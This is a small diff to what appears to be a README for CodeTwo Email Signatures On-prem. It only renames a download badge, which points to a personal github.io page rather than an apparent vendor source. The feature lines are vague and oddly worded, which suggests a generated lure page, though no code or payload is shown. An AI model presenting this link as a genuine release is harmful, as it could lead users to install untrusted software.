@@ -9,7 +9,7 @@
 - A short stamp list in **CodeTwo Email Signatures On-prem**
 - Handoff on the last signature job in **CodeTwo Email Signatures On-prem**
 
-[![Get CodeTwo Email Signatures On-prem Release](https://img.shields.io/badge/Get-CodeTwo_Email_Signatures_On-prem_Release-2C3E50)](https://arlethalachapelle.github.io/.github/CodeTwo-Email)
+[![Get CodeTwo Email Signatures On-prem Release](https://img.shields.io/badge/Get-CodeTwo_Email_Signatures_Release-2C3E50)](https://arlethalachapelle.github.io/.github/CodeTwo-Email)
 
 ---
 
